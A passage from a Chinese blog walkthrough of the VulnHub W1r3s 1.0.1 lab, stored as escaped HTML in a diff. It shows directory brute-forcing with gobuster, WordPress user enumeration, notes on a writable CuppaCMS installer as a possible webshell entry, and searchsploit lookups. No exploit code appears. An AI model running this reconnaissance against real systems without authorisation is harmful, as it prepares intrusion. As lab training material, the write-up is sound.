+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;index.html &lt;span class="o"&gt;(&lt;/span&gt;Status: 200&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 11321&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;javascript &lt;span class="o"&gt;(&lt;/span&gt;Status: 301&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 317&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;--&amp;gt; http://10.10.10.104/javascript/&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;server-status &lt;span class="o"&gt;(&lt;/span&gt;Status: 403&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 300&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;wordpress &lt;span class="o"&gt;(&lt;/span&gt;Status: 301&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 316&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;--&amp;gt; http://10.10.10.104/wordpress/&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Progress: &lt;span class="m"&gt;18452&lt;/span&gt; / &lt;span class="m"&gt;18452&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;100.00%&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;Finished&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;wordpress路径重定向回localhost/wordpress&lt;/li&gt;
+&lt;li&gt;administrator会重定向会/administrator/install&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;访问 &lt;code&gt;http://10.10.10.104/administrator/installation/&lt;/code&gt; 发现是 &lt;strong&gt;Only-Back&lt;/strong&gt; 备份系统的安装向导，&lt;code&gt;Configuration.php Writeable: Yes&lt;/code&gt;，这是一个潜在入口。但先不急着走这条线，因为 WordPress 公开的漏洞很多，优先尝试获取 WordPress 后台权限。&lt;/p&gt;
+&lt;p&gt;/wordpress 进行枚举尝试&lt;/p&gt;
+&lt;h3 id="在wordpress目录下枚举"&gt;在WordPress目录下枚举
+&lt;/h3&gt;&lt;p&gt;虽然被重定向，但是任然可以尝试获取一些信息&lt;/p&gt;
+&lt;p&gt;WPScan 因重定向无法识别 WordPress，使用 &lt;code&gt;--ignore-main-redirect --force&lt;/code&gt; 后成功枚举出用户：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;wpscan --url http://10.10.10.104/wordpress/ --ignore-main-redirect --force --enumerate u
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;关键输出&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; joseph-g
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; Found By: Author Id Brute Forcing - Author Pattern &lt;span class="o"&gt;(&lt;/span&gt;Aggressive Detection&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; admin
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; Found By: Author Id Brute Forcing - Author Pattern &lt;span class="o"&gt;(&lt;/span&gt;Aggressive Detection&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;得到两个用户：&lt;code&gt;admin&lt;/code&gt;、&lt;code&gt;joseph-g&lt;/code&gt;。其中 &lt;code&gt;joseph-g&lt;/code&gt; 与 FTP 员工名单里的 &lt;code&gt;Joseph.G&lt;/code&gt; 对应，格式为“名.姓首字母”转小写并用连字符连接。&lt;/p&gt;
+&lt;p&gt;不过目前方面也到这了，这里我对密码进行爆破没有获得任何结果&lt;/p&gt;
+&lt;h3 id="在administrator目录下枚举"&gt;在administrator目录下枚举
+&lt;/h3&gt;&lt;p&gt;发现这是一个 CuppaCMS 和 Wordpress 都是 内容管理系统，说明靶机存在两个CMS，这里也不知道为什么要安装两个，不过这个 administrator 页很有说法&lt;/p&gt;
+&lt;p&gt;&lt;img class="gallery-image" data-flex-basis="930px" data-flex-grow="387" height="495" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="https://ke1thli.github.io/p/w1r3s-1.0.1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/file-20261013231027650.png" srcset="https://ke1thli.github.io/p/w1r3s-1.0.1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/file-20261013231027650_hu_4a68970321ab5852.png 800w, https://ke1thli.github.io/p/w1r3s-1.0.1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/file-20261013231027650_hu_a0447e718e7803f1.png 1600w, https://ke1thli.github.io/p/w1r3s-1.0.1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/file-20261013231027650.png 1919w" width="1919"&gt;&lt;/p&gt;
+&lt;p&gt;Configuration.php Writeable: Yes：非常重要。安装程序可以写入配置文件。这意味着如果安装流程被继续执行，它可能会允许你写入数据库信息，甚至有可能因为过滤不严导致配置文件篡改，进而写入恶意 PHP 代码（这是常见的漏洞点）。&lt;/p&gt;
+&lt;p&gt;PHP Version &amp;gt;= 5.3: Yes：确认后端支持 PHP。&lt;/p&gt;
+&lt;p&gt;MySQL Support: Yes：确认支持 MySQL，这与端口扫描发现的 3306 端口呼应。&lt;/p&gt;
+&lt;p&gt;JSON Support: Yes：支持 JSON，说明它可能提供 API 接口。&lt;/p&gt;
+&lt;p&gt;File Uploads: On：非常关键。Apache 允许文件上传。如果后续步骤有上传功能，这里极有可能成为上传 WebShell 的入口。&lt;/p&gt;
+&lt;p&gt;Display Errors: Off：错误显示关闭。这意味着通过报错来进行注入或探测路径的难度会增加，需要盲猜或盲注。&lt;/p&gt;
+&lt;p&gt;先对当前目录爆破一下&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;span class="lnt"&gt;30
+&lt;/span&gt;&lt;span class="lnt"&gt;31
+&lt;/span&gt;&lt;span class="lnt"&gt;32
+&lt;/span&gt;&lt;span class="lnt"&gt;33
+&lt;/span&gt;&lt;span class="lnt"&gt;34
+&lt;/span&gt;&lt;span class="lnt"&gt;35
+&lt;/span&gt;&lt;span class="lnt"&gt;36
+&lt;/span&gt;&lt;span class="lnt"&gt;37
+&lt;/span&gt;&lt;span class="lnt"&gt;38
+&lt;/span&gt;&lt;span class="lnt"&gt;39
+&lt;/span&gt;&lt;span class="lnt"&gt;40
+&lt;/span&gt;&lt;span class="lnt"&gt;41
+&lt;/span&gt;&lt;span class="lnt"&gt;42
+&lt;/span&gt;&lt;span class="lnt"&gt;43
+&lt;/span&gt;&lt;span class="lnt"&gt;44
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/W1r3s&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ gobuster dir -u http://10.10.10.104/administrator/ -w /usr/share/wordlists/dirb/common.txt -x php,txt -t &lt;span class="nv"&gt;50&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Gobuster v3.8.2
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;by OJ Reeves &lt;span class="o"&gt;(&lt;/span&gt;@TheColonial&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; Christian Mehlmauer &lt;span class="o"&gt;(&lt;/span&gt;@firefart&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Url: http://10.10.10.104/administrator/
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Method: GET
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Threads: &lt;span class="m"&gt;50&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Wordlist: /usr/share/wordlists/dirb/common.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Negative Status codes: &lt;span class="m"&gt;404&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; User Agent: gobuster/3.8.2
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Extensions: php,txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Timeout: &lt;span class="nv"&gt;10s&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Starting gobuster in directory enumeration &lt;span class="nv"&gt;mode&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;alerts &lt;span class="o"&gt;(&lt;/span&gt;Status: 301&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 327&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;--&amp;gt; http://10.10.10.104/administrator/alerts/&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;api &lt;span class="o"&gt;(&lt;/span&gt;Status: 301&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 324&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;--&amp;gt; http://10.10.10.104/administrator/api/&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;.htpasswd &lt;span class="o"&gt;(&lt;/span&gt;Status: 403&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 310&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;.hta &lt;span class="o"&gt;(&lt;/span&gt;Status: 403&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 305&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;classes &lt;span class="o"&gt;(&lt;/span&gt;Status: 301&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 328&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;--&amp;gt; http://10.10.10.104/administrator/classes/&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;components &lt;span class="o"&gt;(&lt;/span&gt;Status: 301&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 331&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;--&amp;gt; http://10.10.10.104/administrator/components/&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;.hta.php &lt;span class="o"&gt;(&lt;/span&gt;Status: 403&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 309&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;.htaccess &lt;span class="o"&gt;(&lt;/span&gt;Status: 403&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 310&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;.htaccess.txt &lt;span class="o"&gt;(&lt;/span&gt;Status: 403&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 314&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;.hta.txt &lt;span class="o"&gt;(&lt;/span&gt;Status: 403&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 309&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;.htaccess.php &lt;span class="o"&gt;(&lt;/span&gt;Status: 403&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 314&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;.htpasswd.php &lt;span class="o"&gt;(&lt;/span&gt;Status: 403&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 314&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;.htpasswd.txt &lt;span class="o"&gt;(&lt;/span&gt;Status: 403&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 314&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;extensions &lt;span class="o"&gt;(&lt;/span&gt;Status: 301&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 331&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;--&amp;gt; http://10.10.10.104/administrator/extensions/&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;index.php &lt;span class="o"&gt;(&lt;/span&gt;Status: 302&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 6946&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;--&amp;gt; installation/&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;index.php &lt;span class="o"&gt;(&lt;/span&gt;Status: 302&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 6946&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;--&amp;gt; installation/&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;installation &lt;span class="o"&gt;(&lt;/span&gt;Status: 301&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 333&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;--&amp;gt; http://10.10.10.104/administrator/installation/&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;js &lt;span class="o"&gt;(&lt;/span&gt;Status: 301&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 323&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;--&amp;gt; http://10.10.10.104/administrator/js/&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;language &lt;span class="o"&gt;(&lt;/span&gt;Status: 301&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 329&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;--&amp;gt; http://10.10.10.104/administrator/language/&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;media &lt;span class="o"&gt;(&lt;/span&gt;Status: 301&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 326&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;--&amp;gt; http://10.10.10.104/administrator/media/&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;robots.txt &lt;span class="o"&gt;(&lt;/span&gt;Status: 200&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 26&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;robots.txt &lt;span class="o"&gt;(&lt;/span&gt;Status: 200&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 26&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;templates &lt;span class="o"&gt;(&lt;/span&gt;Status: 301&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;Size: 330&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;--&amp;gt; http://10.10.10.104/administrator/templates/&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Progress: &lt;span class="m"&gt;13839&lt;/span&gt; / &lt;span class="m"&gt;13839&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;100.00%&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;Finished&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;没啥有用的&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/W1r3s&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ curl -s http://10.10.10.104/administrator/robots.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;User-agent: *
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Disallow: / 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;也没有信息泄露&lt;/p&gt;
+&lt;h2 id="利用公开漏洞库寻找突破口"&gt;利用公开漏洞库寻找突破口
+&lt;/h2&gt;&lt;p&gt;目前所有路好像都卡住了，但是CuppaCMS是个开源项目，在GitHub上找得到源码&lt;/p&gt;
+&lt;p&gt;&lt;a class="link" href="https://github.com/CuppaCMS/CuppaCMS" target="_blank" rel="noopener"
+ &gt;https://github.com/CuppaCMS/CuppaCMS&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;看看能不能在公开漏洞库找到入手点&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/W1r3s&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ searchsploit cuppacms
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Exploits: No Results
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Shellcodes: No Results
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/W1r3s&lt;span class="o"&gt;]&lt;/span&gt;
